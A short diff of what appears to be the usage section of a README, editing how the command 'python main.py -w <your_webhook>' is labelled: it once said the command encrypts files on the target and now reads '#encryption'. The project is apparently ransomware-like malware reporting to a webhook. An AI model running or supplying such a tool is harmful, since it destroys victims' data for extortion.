@@ -29,7 +29,8 @@ python requirements.txt
 ```
 
 ```bash
-python main.py -w <your_webhook> [this will encrypt files on the target]
+#encryption
+python main.py -w <your_webhook> 
 ```
 
 ```bash
